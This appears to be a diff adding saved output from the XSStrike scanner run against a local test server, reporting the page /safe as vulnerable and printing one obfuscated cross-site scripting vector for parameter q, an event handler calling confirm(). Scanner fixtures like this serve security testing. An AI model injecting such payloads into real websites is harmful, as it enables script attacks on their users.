@@ -1,0 +1,10 @@
+
+	XSStrike v3.1.5
+
+ Crawling the target 
+ Parsing safe?q=a&id=1                           
+ 
+[++] Vulnerable webpage: http://127.0.0.1:8080/safe 
+[++] Vector for q: <d3v/+/oNMouseover+=+confirm()//v3dm0s 
+ Progress: 2/2
+ 
